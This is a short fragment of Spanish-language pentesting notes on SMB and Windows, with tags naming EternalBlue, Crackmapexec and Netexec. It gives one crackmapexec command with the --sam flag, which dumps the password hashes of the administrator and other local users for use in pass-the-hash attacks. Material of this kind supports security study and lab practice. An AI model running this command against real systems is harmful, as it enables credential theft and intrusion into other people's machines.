...
Tags: #SMB #Comandos #Windows #Servidor #EternalBlue #Crackmapexec #Netexec 
...
❯ crackmapexec smb ❮IP❯ -u <‘USER’> -p <‘PASSWORD’> --sam    # Podremos listar el hash del usuario administrador y del resto que existan en el sistema, con los que podemos llegar a aplicar pass de hash 
